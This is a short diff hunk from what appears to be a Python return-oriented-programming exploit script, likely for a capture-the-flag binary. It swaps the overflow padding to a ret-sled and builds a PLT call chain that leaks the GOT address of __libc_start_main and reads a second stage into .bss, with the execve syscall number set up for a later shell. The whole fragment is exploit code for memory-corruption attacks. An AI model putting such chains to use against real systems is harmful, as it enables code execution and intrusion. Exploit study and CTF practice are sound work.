@@ -7,7 +7,7 @@ rop = ROP(fpath)
 addr_stage = rop.section('.bss') + 0x400
 nr_execve = 59
 
-buf = rop.fill(offset)
+buf = rop.retfill(offset)
 buf += rop.call_chain_plt(
     ['write', 1, rop.got('__libc_start_main'), 8],
     ['read', 0, addr_stage, 400]
